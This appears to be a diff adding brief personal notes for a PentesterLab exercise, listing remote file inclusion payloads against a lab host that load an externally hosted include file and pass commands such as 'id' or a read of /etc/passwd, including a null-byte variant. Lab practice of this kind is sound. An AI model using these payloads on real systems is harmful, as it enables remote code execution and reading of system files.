@@ -1,0 +1,10 @@
+Steps:
+-------
+http://assets.pentesterlab.com/test_include.txt
+ptl-40c84ebb-fd1ced79.libcurl.so/?page=http://assets.pentesterlab.com/test_include_system.txt&c= [/etc/passwd] or [id] 
+
+
+OR
+
+ptl-40c84ebb-fd1ced79.libcurl.so/?page=http://assets.pentesterlab.com/test_include_system.txt %00 &c= [/etc/passwd] or [id] 
+
